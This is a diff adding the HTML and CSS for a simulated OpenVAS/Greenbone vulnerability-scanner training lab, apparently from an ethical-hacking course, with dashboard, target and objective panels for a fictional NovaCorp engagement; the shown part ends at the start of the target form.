@@ -1,0 +1,2585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerability Assessment Lab - EHE | The Vault</title>
+
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+
+    <style>
+        /* ─── Reset & Base ─── */
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg-deep:    #0a0508;
+            --bg-panel:   #0f0a14;
+            --bg-surface: #13101a;
+            --bg-input:   #1a1525;
+            --accent:     #9333ea;
+            --accent-lt:  #a855f7;
+            --accent-dim: rgba(147, 51, 234, 0.15);
+            --border:     rgba(100, 60, 130, 0.25);
+            --border-lt:  rgba(147, 51, 234, 0.4);
+            --text-hi:    #d4b8e8;
+            --text-mid:   #9a7ab0;
+            --text-lo:    #5a3a6a;
+
+            /* Severity palette */
+            --crit:    #ef4444;
+            --crit-bg: rgba(239, 68, 68, 0.12);
+            --high:    #f97316;
+            --high-bg: rgba(249, 115, 22, 0.12);
+            --med:     #eab308;
+            --med-bg:  rgba(234, 179, 8, 0.12);
+            --low:     #3b82f6;
+            --low-bg:  rgba(59, 130, 246, 0.12);
+            --info:    #6b7280;
+            --info-bg: rgba(107, 114, 128, 0.12);
+
+            /* GSA green-on-dark for the tool chrome */
+            --gsa-header:  #111827;
+            --gsa-sidebar: #0f172a;
+            --gsa-nav-act: rgba(147, 51, 234, 0.2);
+            --gsa-border:  rgba(55, 65, 81, 0.6);
+        }
+
+        html, body {
+            height: 100%;
+            overflow: hidden;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-size: 13px;
+            background: var(--bg-deep);
+            color: var(--text-mid);
+        }
+
+        /* ─── Outer Shell (lab wrapper) ─── */
+        .lab-shell {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* ─── Lab Chrome Header ─── */
+        .lab-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background: rgba(10, 5, 15, 0.97);
+            border-bottom: 1px solid var(--border);
+            flex-shrink: 0;
+            z-index: 200;
+        }
+
+        .lab-header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .back-btn {
+            color: var(--text-lo);
+            text-decoration: none;
+            font-size: 0.75rem;
+            letter-spacing: 0.08em;
+            padding: 5px 12px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            transition: all 0.25s;
+        }
+
+        .back-btn:hover {
+            color: var(--accent-lt);
+            border-color: var(--border-lt);
+            background: var(--accent-dim);
+        }
+
+        .lab-badge {
+            font-size: 0.65rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: var(--text-lo);
+            padding: 3px 10px;
+            border: 1px solid var(--border);
+            border-radius: 3px;
+        }
+
+        .lab-title-text {
+            font-size: 0.85rem;
+            color: var(--text-hi);
+            font-weight: 600;
+        }
+
+        .lab-header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        /* Objective tracker pills */
+        .obj-tracker {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.7rem;
+            color: var(--text-lo);
+        }
+
+        .obj-count {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--accent-lt);
+        }
+
+        /* Score display */
+        .score-display {
+            font-size: 0.7rem;
+            color: var(--text-lo);
+            text-align: right;
+        }
+
+        .score-value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--accent-lt);
+        }
+
+        /* Hint button */
+        .hint-btn {
+            font-size: 0.7rem;
+            padding: 5px 12px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            background: transparent;
+            color: var(--text-lo);
+            cursor: pointer;
+            transition: all 0.25s;
+            letter-spacing: 0.05em;
+        }
+
+        .hint-btn:hover {
+            color: var(--med);
+            border-color: rgba(234, 179, 8, 0.4);
+            background: rgba(234, 179, 8, 0.05);
+        }
+
+        /* ─── Lab Body (split: tool | objectives) ─── */
+        .lab-body {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+
+        /* ─── GSA Tool Wrapper ─── */
+        .gsa-wrapper {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            border-right: 1px solid var(--border);
+        }
+
+        /* ─── GSA Top Bar ─── */
+        .gsa-topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            height: 46px;
+            background: var(--gsa-header);
+            border-bottom: 1px solid var(--gsa-border);
+            flex-shrink: 0;
+        }
+
+        .gsa-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .gsa-logo {
+            width: 26px;
+            height: 26px;
+        }
+
+        .gsa-brand-name {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: #e5e7eb;
+            letter-spacing: 0.02em;
+        }
+
+        .gsa-brand-sub {
+            font-size: 0.65rem;
+            color: #6b7280;
+            letter-spacing: 0.1em;
+            margin-left: 2px;
+        }
+
+        .gsa-status-pill {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.7rem;
+            padding: 3px 10px;
+            border-radius: 12px;
+            border: 1px solid transparent;
+        }
+
+        .gsa-status-pill.idle {
+            color: #6b7280;
+            border-color: rgba(107, 114, 128, 0.3);
+            background: rgba(107, 114, 128, 0.08);
+        }
+
+        .gsa-status-pill.running {
+            color: #10b981;
+            border-color: rgba(16, 185, 129, 0.4);
+            background: rgba(16, 185, 129, 0.08);
+        }
+
+        .gsa-status-pill.done {
+            color: #3b82f6;
+            border-color: rgba(59, 130, 246, 0.4);
+            background: rgba(59, 130, 246, 0.08);
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: currentColor;
+        }
+
+        .status-dot.pulse {
+            animation: statusPulse 1.2s ease-in-out infinite;
+        }
+
+        @keyframes statusPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .gsa-user {
+            font-size: 0.7rem;
+            color: #6b7280;
+        }
+
+        /* ─── GSA Layout (sidebar + main panel) ─── */
+        .gsa-layout {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+
+        /* ─── GSA Sidebar ─── */
+        .gsa-sidebar {
+            width: 180px;
+            background: var(--gsa-sidebar);
+            border-right: 1px solid var(--gsa-border);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+            overflow-y: auto;
+        }
+
+        .gsa-nav-section {
+            padding: 16px 0 8px;
+        }
+
+        .gsa-nav-label {
+            font-size: 0.6rem;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            color: #4b5563;
+            padding: 0 16px 6px;
+        }
+
+        .gsa-nav-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 16px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            color: #9ca3af;
+            transition: all 0.2s;
+            border-left: 2px solid transparent;
+            user-select: none;
+        }
+
+        .gsa-nav-item:hover {
+            color: #e5e7eb;
+            background: rgba(55, 65, 81, 0.3);
+        }
+
+        .gsa-nav-item.active {
+            color: var(--accent-lt);
+            background: var(--gsa-nav-act);
+            border-left-color: var(--accent);
+        }
+
+        .gsa-nav-icon {
+            width: 16px;
+            text-align: center;
+            font-size: 0.85rem;
+            flex-shrink: 0;
+        }
+
+        /* ─── GSA Main Panel ─── */
+        .gsa-main {
+            flex: 1;
+            overflow-y: auto;
+            background: #0d1117;
+            padding: 20px;
+        }
+
+        /* Scrollbar styling for the main panel */
+        .gsa-main::-webkit-scrollbar { width: 6px; }
+        .gsa-main::-webkit-scrollbar-track { background: #0d1117; }
+        .gsa-main::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
+
+        /* Panel views — only the active view is shown */
+        .panel-view { display: none; }
+        .panel-view.active { display: block; }
+
+        /* ─── Panel Headers ─── */
+        .panel-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid var(--gsa-border);
+        }
+
+        .panel-title {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #e5e7eb;
+        }
+
+        .panel-subtitle {
+            font-size: 0.7rem;
+            color: #6b7280;
+            margin-top: 2px;
+        }
+
+        /* ─── Dashboard Cards ─── */
+        .dash-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .dash-card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 14px 16px;
+        }
+
+        .dash-card-label {
+            font-size: 0.65rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: #6b7280;
+            margin-bottom: 6px;
+        }
+
+        .dash-card-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+
+        .dash-card-value.critical { color: var(--crit); }
+        .dash-card-value.high     { color: var(--high); }
+        .dash-card-value.medium   { color: var(--med); }
+        .dash-card-value.low      { color: var(--low); }
+
+        .dash-feed {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 14px 16px;
+        }
+
+        .dash-feed-title {
+            font-size: 0.7rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: #6b7280;
+            margin-bottom: 10px;
+        }
+
+        .feed-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 6px 0;
+            border-bottom: 1px solid #21262d;
+            font-size: 0.78rem;
+        }
+
+        .feed-item:last-child { border-bottom: none; }
+
+        .feed-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            margin-top: 4px;
+            flex-shrink: 0;
+        }
+
+        .feed-text { color: #9ca3af; }
+        .feed-time { color: #4b5563; font-size: 0.7rem; margin-left: auto; white-space: nowrap; }
+
+        /* ─── GSA Button Styles ─── */
+        .gsa-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            border-radius: 5px;
+            font-size: 0.78rem;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            letter-spacing: 0.02em;
+        }
+
+        .gsa-btn-primary {
+            background: var(--accent);
+            color: #fff;
+        }
+
+        .gsa-btn-primary:hover {
+            background: var(--accent-lt);
+        }
+
+        .gsa-btn-primary:disabled {
+            background: #374151;
+            color: #4b5563;
+            cursor: not-allowed;
+        }
+
+        .gsa-btn-ghost {
+            background: transparent;
+            color: #9ca3af;
+            border: 1px solid #374151;
+        }
+
+        .gsa-btn-ghost:hover {
+            color: #e5e7eb;
+            border-color: #6b7280;
+        }
+
+        .gsa-btn-danger {
+            background: rgba(239, 68, 68, 0.15);
+            color: var(--crit);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .gsa-btn-danger:hover {
+            background: rgba(239, 68, 68, 0.25);
+        }
+
+        .gsa-btn-success {
+            background: rgba(16, 185, 129, 0.15);
+            color: #10b981;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .gsa-btn-success:hover {
+            background: rgba(16, 185, 129, 0.25);
+        }
+
+        /* ─── Tables ─── */
+        .gsa-table-wrap {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        .gsa-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .gsa-table th {
+            background: #1c2128;
+            padding: 10px 14px;
+            text-align: left;
+            font-size: 0.68rem;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: #6b7280;
+            border-bottom: 1px solid #30363d;
+            white-space: nowrap;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .gsa-table th:hover { color: #9ca3af; }
+        .gsa-table th.sort-asc::after  { content: ' \2191'; }
+        .gsa-table th.sort-desc::after { content: ' \2193'; }
+
+        .gsa-table td {
+            padding: 9px 14px;
+            font-size: 0.8rem;
+            color: #d1d5db;
+            border-bottom: 1px solid #21262d;
+            vertical-align: middle;
+        }
+
+        .gsa-table tr:last-child td { border-bottom: none; }
+
+        .gsa-table tr.clickable {
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+
+        .gsa-table tr.clickable:hover td { background: #1c2128; }
+
+        /* Expanded row detail */
+        .row-detail {
+            display: none;
+            background: #0d1117;
+        }
+
+        .row-detail.open { display: table-row; }
+
+        .row-detail td {
+            padding: 16px 20px;
+            border-top: 1px solid #21262d;
+        }
+
+        .detail-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .detail-section {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 5px;
+            padding: 12px 14px;
+        }
+
+        .detail-section h4 {
+            font-size: 0.65rem;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            color: #6b7280;
+            margin-bottom: 6px;
+        }
+
+        .detail-section p {
+            font-size: 0.78rem;
+            color: #9ca3af;
+            line-height: 1.5;
+        }
+
+        .detail-section.full { grid-column: 1 / -1; }
+
+        .detail-cvss-bar {
+            height: 6px;
+            border-radius: 3px;
+            background: #30363d;
+            margin-top: 6px;
+            overflow: hidden;
+        }
+
+        .detail-cvss-fill {
+            height: 100%;
+            border-radius: 3px;
+            transition: width 0.4s ease;
+        }
+
+        /* ─── Severity Badges ─── */
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 0.68rem;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+        }
+
+        .badge-critical { background: var(--crit-bg); color: var(--crit); border: 1px solid rgba(239,68,68,0.3); }
+        .badge-high     { background: var(--high-bg); color: var(--high); border: 1px solid rgba(249,115,22,0.3); }
+        .badge-medium   { background: var(--med-bg);  color: var(--med);  border: 1px solid rgba(234,179,8,0.3); }
+        .badge-low      { background: var(--low-bg);  color: var(--low);  border: 1px solid rgba(59,130,246,0.3); }
+
+        /* CVSS score color */
+        .cvss-crit { color: var(--crit); font-weight: 700; }
+        .cvss-high { color: var(--high); font-weight: 700; }
+        .cvss-med  { color: var(--med);  font-weight: 700; }
+        .cvss-low  { color: var(--low);  font-weight: 700; }
+
+        /* ─── Forms ─── */
+        .gsa-form {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+            max-width: 560px;
+        }
+
+        .form-row {
+            margin-bottom: 14px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.72rem;
+            color: #9ca3af;
+            margin-bottom: 5px;
+            letter-spacing: 0.04em;
+        }
+
+        .form-label .required {
+            color: var(--crit);
+            margin-left: 2px;
+        }
+
+        .form-input,
+        .form-select {
+            width: 100%;
+            padding: 7px 11px;
+            background: #0d1117;
+            border: 1px solid #374151;
+            border-radius: 4px;
+            color: #e5e7eb;
+            font-size: 0.82rem;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+
+        .form-input:focus,
+        .form-select:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(147, 51, 234, 0.15);
+        }
+
+        .form-input.error { border-color: var(--crit); }
+
+        .form-error {
+            font-size: 0.68rem;
+            color: var(--crit);
+            margin-top: 3px;
+            display: none;
+        }
+
+        .form-error.visible { display: block; }
+
+        .form-hint {
+            font-size: 0.68rem;
+            color: #4b5563;
+            margin-top: 3px;
+        }
+
+        .form-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 18px;
+            padding-top: 14px;
+            border-top: 1px solid #30363d;
+        }
+
+        /* ─── Progress Bar (Scan) ─── */
+        .scan-progress-wrap {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+
+        .scan-progress-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .scan-progress-title {
+            font-size: 0.82rem;
+            color: #e5e7eb;
+            font-weight: 600;
+        }
+
+        .scan-progress-pct {
+            font-size: 0.82rem;
+            color: var(--accent-lt);
+            font-weight: 700;
+        }
+
+        .scan-bar-track {
+            height: 8px;
+            background: #21262d;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .scan-bar-fill {
+            height: 100%;
+            border-radius: 4px;
+            background: linear-gradient(90deg, #7c3aed, #a855f7, #c084fc);
+            background-size: 200% 100%;
+            width: 0%;
+            transition: width 0.3s ease;
+            animation: scanShimmer 2s linear infinite;
+        }
+
+        @keyframes scanShimmer {
+            0%   { background-position: 0% 0%; }
+            100% { background-position: 200% 0%; }
+        }
+
+        /* Scan Log */
+        .scan-log {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px 16px;
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.73rem;
+            color: #6b7280;
+            height: 160px;
+            overflow-y: auto;
+            line-height: 1.6;
+        }
+
+        .scan-log::-webkit-scrollbar { width: 4px; }
+        .scan-log::-webkit-scrollbar-thumb { background: #374151; border-radius: 2px; }
+
+        .log-line { display: block; }
+        .log-line.info    { color: #60a5fa; }
+        .log-line.warn    { color: var(--med); }
+        .log-line.success { color: #34d399; }
+        .log-line.error   { color: var(--crit); }
+        .log-line.crit    { color: var(--crit); font-weight: 700; }
+
+        /* ─── Tasks Status Indicators ─── */
+        .task-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.72rem;
+            padding: 2px 8px;
+            border-radius: 10px;
+        }
+
+        .task-status.new      { color: #6b7280; background: rgba(107,114,128,0.1); border: 1px solid rgba(107,114,128,0.2); }
+        .task-status.requested{ color: var(--med); background: rgba(234,179,8,0.1); border: 1px solid rgba(234,179,8,0.2); }
+        .task-status.running  { color: #10b981; background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.2); }
+        .task-status.done     { color: #3b82f6; background: rgba(59,130,246,0.1); border: 1px solid rgba(59,130,246,0.2); }
+
+        /* ─── Report View ─── */
+        .report-section {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 18px 20px;
+            margin-bottom: 14px;
+        }
+
+        .report-section h3 {
+            font-size: 0.82rem;
+            color: #e5e7eb;
+            font-weight: 600;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .report-section p {
+            font-size: 0.8rem;
+            color: #9ca3af;
+            line-height: 1.7;
+            margin-bottom: 8px;
+        }
+
+        .report-exec-metrics {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+
+        .exec-metric {
+            text-align: center;
+            padding: 12px;
+            border-radius: 5px;
+            border: 1px solid transparent;
+        }
+
+        .exec-metric.critical { background: var(--crit-bg); border-color: rgba(239,68,68,0.25); }
+        .exec-metric.high     { background: var(--high-bg); border-color: rgba(249,115,22,0.25); }
+        .exec-metric.medium   { background: var(--med-bg);  border-color: rgba(234,179,8,0.25); }
+        .exec-metric.low      { background: var(--low-bg);  border-color: rgba(59,130,246,0.25); }
+
+        .exec-metric-num {
+            font-size: 1.8rem;
+            font-weight: 700;
+            line-height: 1;
+            margin-bottom: 4px;
+        }
+
+        .exec-metric.critical .exec-metric-num { color: var(--crit); }
+        .exec-metric.high     .exec-metric-num { color: var(--high); }
+        .exec-metric.medium   .exec-metric-num { color: var(--med); }
+        .exec-metric.low      .exec-metric-num { color: var(--low); }
+
+        .exec-metric-label {
+            font-size: 0.65rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            color: #6b7280;
+        }
+
+        .remediation-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 8px 0;
+            border-bottom: 1px solid #21262d;
+            font-size: 0.78rem;
+        }
+
+        .remediation-item:last-child { border-bottom: none; }
+
+        .remediation-priority {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            margin-top: 5px;
+            flex-shrink: 0;
+        }
+
+        .remediation-text { color: #9ca3af; line-height: 1.5; }
+        .remediation-text strong { color: #d1d5db; }
+
+        /* ─── Empty State ─── */
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: #4b5563;
+        }
+
+        .empty-state-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            opacity: 0.5;
+        }
+
+        .empty-state p {
+            font-size: 0.8rem;
+        }
+
+        /* ─── Objectives Panel (right column) ─── */
+        .objectives-panel {
+            width: 300px;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            background: var(--bg-panel);
+            overflow-y: auto;
+        }
+
+        .objectives-panel::-webkit-scrollbar { width: 4px; }
+        .objectives-panel::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+        .obj-panel-header {
+            padding: 14px 16px;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.65rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: var(--text-lo);
+            flex-shrink: 0;
+        }
+
+        .obj-list {
+            padding: 12px;
+            flex: 1;
+        }
+
+        .obj-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 9px 10px;
+            border-radius: 5px;
+            margin-bottom: 4px;
+            transition: background 0.2s;
+        }
+
+        .obj-item.complete {
+            background: rgba(34, 197, 94, 0.04);
+        }
+
+        .obj-check {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 1.5px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-top: 1px;
+            transition: all 0.3s;
+            font-size: 0.65rem;
+        }
+
+        .obj-item.complete .obj-check {
+            background: rgba(34, 197, 94, 0.15);
+            border-color: rgba(34, 197, 94, 0.5);
+            color: #22c55e;
+        }
+
+        .obj-text {
+            font-size: 0.75rem;
+            color: var(--text-lo);
+            line-height: 1.4;
+            transition: color 0.3s;
+        }
+
+        .obj-item.complete .obj-text {
+            color: var(--text-mid);
+            text-decoration: line-through;
+            text-decoration-color: rgba(34, 197, 94, 0.3);
+        }
+
+        /* Hint panel */
+        .hint-panel {
+            margin: 0 12px 12px;
+            background: rgba(234, 179, 8, 0.05);
+            border: 1px solid rgba(234, 179, 8, 0.2);
+            border-radius: 5px;
+            padding: 10px 12px;
+            display: none;
+        }
+
+        .hint-panel.visible { display: block; }
+
+        .hint-panel-title {
+            font-size: 0.6rem;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            color: var(--med);
+            margin-bottom: 5px;
+        }
+
+        .hint-panel-text {
+            font-size: 0.75rem;
+            color: #9ca3af;
+            line-height: 1.5;
+        }
+
+        /* Completion banner */
+        .completion-banner {
+            margin: 12px;
+            background: rgba(34, 197, 94, 0.08);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            border-radius: 6px;
+            padding: 14px;
+            display: none;
+        }
+
+        .completion-banner.visible { display: block; }
+
+        .completion-banner h3 {
+            font-size: 0.75rem;
+            color: #22c55e;
+            margin-bottom: 6px;
+            letter-spacing: 0.08em;
+        }
+
+        .completion-banner p {
+            font-size: 0.72rem;
+            color: #9ca3af;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .completion-score {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--accent-lt);
+            margin-bottom: 10px;
+        }
+
+        .complete-btn {
+            width: 100%;
+            padding: 8px;
+            background: rgba(34, 197, 94, 0.15);
+            border: 1px solid rgba(34, 197, 94, 0.35);
+            border-radius: 5px;
+            color: #22c55e;
+            font-size: 0.78rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s;
+            letter-spacing: 0.05em;
+        }
+
+        .complete-btn:hover {
+            background: rgba(34, 197, 94, 0.25);
+        }
+
+        /* ─── Toast Notifications ─── */
+        #toast-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            pointer-events: none;
+        }
+
+        .toast {
+            padding: 10px 16px;
+            border-radius: 6px;
+            font-size: 0.78rem;
+            color: #e5e7eb;
+            pointer-events: all;
+            animation: toastIn 0.3s ease;
+            max-width: 280px;
+        }
+
+        .toast.success { background: rgba(16, 185, 129, 0.9); border: 1px solid rgba(16, 185, 129, 0.5); }
+        .toast.warn    { background: rgba(234, 179, 8, 0.9);  border: 1px solid rgba(234, 179, 8, 0.5); color: #000; }
+        .toast.info    { background: rgba(147, 51, 234, 0.9); border: 1px solid rgba(147, 51, 234, 0.5); }
+
+        @keyframes toastIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to   { opacity: 1; transform: translateX(0); }
+        }
+
+        /* ─── Responsive guard ─── */
+        @media (max-width: 900px) {
+            .objectives-panel { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="lab-shell">
+
+    <!-- ─── Lab Chrome Header ─── -->
+    <header class="lab-header">
+        <div class="lab-header-left">
+            <a href="../index.html" class="back-btn">← EHE</a>
+            <span class="lab-badge">Lab // Vuln Assessment</span>
+            <span class="lab-title-text">OpenVAS Vulnerability Scanner</span>
+        </div>
+        <div class="lab-header-right">
+            <div class="obj-tracker">
+                <span>Objectives:</span>
+                <span class="obj-count" id="objCount">0 / 8</span>
+            </div>
+            <div class="score-display">
+                <div>Score</div>
+                <div class="score-value" id="scoreDisplay">100</div>
+            </div>
+            <button class="hint-btn" id="hintBtn" onclick="showHint()">Hint (-5)</button>
+        </div>
+    </header>
+
+    <!-- ─── Lab Body ─── -->
+    <div class="lab-body">
+
+        <!-- ─── Greenbone Security Assistant (GSA) Tool ─── -->
+        <div class="gsa-wrapper">
+
+            <!-- GSA Top Bar -->
+            <div class="gsa-topbar">
+                <div class="gsa-brand">
+                    <!-- SVG shield logo approximating Greenbone branding -->
+                    <svg class="gsa-logo" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M16 2L4 7V16C4 22.627 9.373 28 16 30C22.627 28 28 22.627 28 16V7L16 2Z" fill="rgba(16,185,129,0.15)" stroke="#10b981" stroke-width="1.5"/>
+                        <path d="M11 16.5L14.5 20L21 13" stroke="#10b981" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <div>
+                        <div class="gsa-brand-name">Greenbone Security Assistant</div>
+                        <div class="gsa-brand-sub">OpenVAS 22.4 // NovaCorp Engagement</div>
+                    </div>
+                </div>
+                <div id="gsaStatusPill" class="gsa-status-pill idle">
+                    <div class="status-dot" id="statusDot"></div>
+                    <span id="statusText">Idle</span>
+                </div>
+                <div class="gsa-user">analyst@novacorp.lab</div>
+            </div>
+
+            <!-- GSA Layout -->
+            <div class="gsa-layout">
+
+                <!-- Sidebar -->
+                <nav class="gsa-sidebar">
+                    <div class="gsa-nav-section">
+                        <div class="gsa-nav-label">Overview</div>
+                        <div class="gsa-nav-item active" data-panel="dashboard" onclick="switchPanel('dashboard', this)">
+                            <span class="gsa-nav-icon">&#9632;</span>
+                            Dashboard
+                        </div>
+                    </div>
+                    <div class="gsa-nav-section">
+                        <div class="gsa-nav-label">Configuration</div>
+                        <div class="gsa-nav-item" data-panel="targets" onclick="switchPanel('targets', this)">
+                            <span class="gsa-nav-icon">&#9675;</span>
+                            Targets
+                        </div>
+                        <div class="gsa-nav-item" data-panel="tasks" onclick="switchPanel('tasks', this)">
+                            <span class="gsa-nav-icon">&#9670;</span>
+                            Tasks
+                        </div>
+                    </div>
+                    <div class="gsa-nav-section">
+                        <div class="gsa-nav-label">Findings</div>
+                        <div class="gsa-nav-item" data-panel="results" onclick="switchPanel('results', this)">
+                            <span class="gsa-nav-icon">&#9651;</span>
+                            Results
+                        </div>
+                        <div class="gsa-nav-item" data-panel="reports" onclick="switchPanel('reports', this)">
+                            <span class="gsa-nav-icon">&#9632;</span>
+                            Reports
+                        </div>
+                    </div>
+                </nav>
+
+                <!-- Main Panel -->
+                <main class="gsa-main" id="gsaMain">
+
+                    <!-- ══ DASHBOARD ══ -->
+                    <div class="panel-view active" id="panel-dashboard">
+                        <div class="panel-header">
+                            <div>
+                                <div class="panel-title">Dashboard</div>
+                                <div class="panel-subtitle">Security posture overview for NovaCorp</div>
+                            </div>
+                        </div>
+
+                        <div class="dash-grid" id="dashGrid">
+                            <div class="dash-card">
+                                <div class="dash-card-label">Critical</div>
+                                <div class="dash-card-value critical" id="dashCrit">—</div>
+                            </div>
+                            <div class="dash-card">
+                                <div class="dash-card-label">High</div>
+                                <div class="dash-card-value high" id="dashHigh">—</div>
+                            </div>
+                            <div class="dash-card">
+                                <div class="dash-card-label">Medium</div>
+                                <div class="dash-card-value medium" id="dashMed">—</div>
+                            </div>
+                            <div class="dash-card">
+                                <div class="dash-card-label">Low</div>
+                                <div class="dash-card-value low" id="dashLow">—</div>
+                            </div>
+                        </div>
+
+                        <div class="dash-feed">
+                            <div class="dash-feed-title">Activity Feed</div>
+                            <div id="activityFeed">
+                                <div class="feed-item">
+                                    <div class="feed-dot" style="background:#6b7280"></div>
+                                    <span class="feed-text">Scanner initialized. Awaiting configuration.</span>
+                                    <span class="feed-time">now</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ══ TARGETS ══ -->
+                    <div class="panel-view" id="panel-targets">
+                        <div class="panel-header">
+                            <div>
+                                <div class="panel-title">Targets</div>
+                                <div class="panel-subtitle">Define hosts and networks to scan</div>
+                            </div>
+                            <button class="gsa-btn gsa-btn-primary" id="newTargetBtn" onclick="showTargetForm()">+ New Target</button>
+                        </div>
+
+                        <!-- Target Form (hidden initially) -->
